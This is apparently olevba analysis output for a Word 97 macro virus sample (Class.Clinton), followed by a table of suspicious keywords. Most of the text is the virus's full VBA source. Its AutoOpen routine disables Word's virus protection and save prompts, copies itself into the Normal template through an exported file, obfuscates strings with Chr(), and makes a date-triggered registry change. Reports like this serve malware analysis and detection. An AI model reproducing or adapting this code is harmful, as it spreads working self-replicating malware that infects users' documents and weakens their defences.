olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.bk-521433783604b6b6e4025251f8ee110a8be8d694
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.bk-521433783604b6b6e4025251f8ee110a8be8d694 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()

On Error GoTo done

Options.VirusProtection = Chr(48): x = 0: vx = 1: xv = 4: zz = 2

Options.SaveNormalPrompt = Chr(48)

Options.ConfirmConversions = Chr(48)

Clintons = ActiveDocument.VBProject.VBComponents.Item(Cos(Atn(CInt(1)))).codemodule.CountOfLines

Clintonr = NormalTemplate.VBProject.VBComponents.Item(Cos(Atn(CInt(1)))).codemodule.CountOfLines

If Clintonr > 70 And Clintons > Sgn(x) Then GoTo done

If Clintonr < 70 Then

    Set Monica = NormalTemplate.VBProject.VBComponents.Item(Cos(Atn(CInt(1))))

    ActiveDocument.VBProject.VBComponents.Item(Cos(Atn(CInt(1)))).Name = Monica.Name

    ActiveDocument.VBProject.VBComponents.Item(Cos(Atn(CInt(1)))).Export Windows.Application.Path & Chr(67) + Chr(108) + Chr(105) + Chr(110) + Chr(116) + Chr(111) + Chr(110) + Chr(46) + Chr(100) + Chr(108) + Chr(108)

End If

If Clintons = Sgn(x) Then Set Monica = ActiveDocument.VBProject.VBComponents.Item(Cos(Atn(CInt(1))))

Infect = Int(Rnd * 100)

If Infect = 99 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(86) + Chr(105) + Chr(82) + Chr(117) + Chr(83) + Chr(32) + Chr(83) + Chr(65) + Chr(89) + Chr(83) + Chr(32) + Chr(72) + Chr(73)

If Month(Now()) > 8 And Day(Now()) = 17 Then System.PrivateProfileString("", "HKEY_CLASSES_ROOT\Word.Document.8", "") = "Class Clinton Document"

Monica.codemodule.AddFromFile Windows.Application.Path & Chr(67) + Chr(108) + Chr(105) + Chr(110) + Chr(116) + Chr(111) + Chr(110) + Chr(46) + Chr(100) + Chr(108) + Chr(108)

With Monica.codemodule

    For j = Abs(vx) To Abs(xv)

    .deletelines Abs(vx)

    Next j

End With

If Clintonr < 70 Then

    With Monica.codemodule

    .replaceline Abs(vx), "Sub AutoClose()"

    .replaceline 75, "Sub ToolsMacro()"

    End With

End If

With Monica.codemodule

    For j = Abs(zz) To 72 Step Abs(zz)

    .replaceline j, Chr(39) & Application.Assistant & Application.DisplayRecentFiles & Application.FocusInMailHeader & Application.Build & Application.StartupPath & Application.ActiveDocument & Application.Version

    Next j

End With

done:

If Clintonr > 70 And Clintons = Sgn(x) Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName

End Sub

Sub ViewVBCode()

End Sub 'Word97/Class.Clinton.A by Virus ;) Smile
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

